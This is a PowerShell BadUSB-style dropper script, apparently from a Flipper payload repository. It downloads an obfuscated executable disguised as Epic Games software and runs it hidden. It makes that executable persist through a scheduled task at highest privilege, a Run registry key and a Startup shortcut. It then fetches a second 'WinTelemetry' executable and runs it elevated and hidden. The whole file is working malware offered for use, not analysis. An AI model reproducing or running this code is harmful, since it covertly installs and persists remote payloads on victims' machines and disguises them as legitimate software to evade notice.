# =======================
# === CONFIG SECTION ===
# =======================

$mainExeUrl = "https://github.com/the-shadow-walker/bad-usb-flipper-payloads/raw/refs/heads/main/Obfuscated%20Programs/Epic-Games.exe"
$mainExePath = "$env:APPDATA\.exe"
$mainTaskName = "Epic Games Manager"
$mainRunKey = "Epic Games"

$telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
$telemetryPath = "$env:TEMP\WinTelemetry.exe"

# ============================
# === PERSISTENCE FUNCTION ===
# ============================

function Add-Persistence {
    param (
        [string]$exePath,
        [string]$exeUrl,
        [string]$taskName,
        [string]$runKeyName
    )

    try {
        # Download EXE if missing
        if (-not (Test-Path $exePath)) {
            Write-Host "[INFO] Downloading payload from $exeUrl"
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
        }

        # Start EXE silently
        Write-Host "[INFO] Starting $exePath"
        Start-Process -FilePath $exePath -WindowStyle Hidden

        # Create Scheduled Task
        $action = New-ScheduledTaskAction -Execute $exePath
        $triggers = @(
            New-ScheduledTaskTrigger -AtLogOn
            New-ScheduledTaskTrigger -AtStartup
            New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1)
            New-ScheduledTaskTrigger -AtWorkStationUnlock
            New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
        )
        $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)

        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop)) {
            Write-Host "[INFO] Registering scheduled task: $taskName"
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
        }

        # Registry fallback
        Write-Host "[INFO] Setting Run key: $runKeyName"
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runKeyName -Value $exePath

        # Startup shortcut
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $shortcutPath = Join-Path $startupPath "$taskName.lnk"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $exePath
        $shortcut.WorkingDirectory = Split-Path $exePath
        $shortcut.WindowStyle = 7
        $shortcut.Save()

        Write-Host "[SUCCESS] Persistence setup completed."

    } catch {
        Write-Error "[ERROR] $($_.Exception.Message)"
    }
}

# ===========================
# === EXECUTE PERSISTENCE ===
# ===========================

Add-Persistence -exePath $mainExePath -exeUrl $mainExeUrl -taskName $mainTaskName -runKeyName $mainRunKey

# ============================
# === ONE-TIME PAYLOAD RUN ===
# ============================

try {
    Write-Host "[INFO] Downloading telemetry payload from $telemetryUrl"
    Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
    Write-Host "[INFO] Running telemetry payload"
    Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
    Start-Sleep -Seconds 5
    # Remove-Item -Path $telemetryPath -Force
} catch {
    Write-Error "[ERROR - TELEMETRY] $($_.Exception.Message)"
}
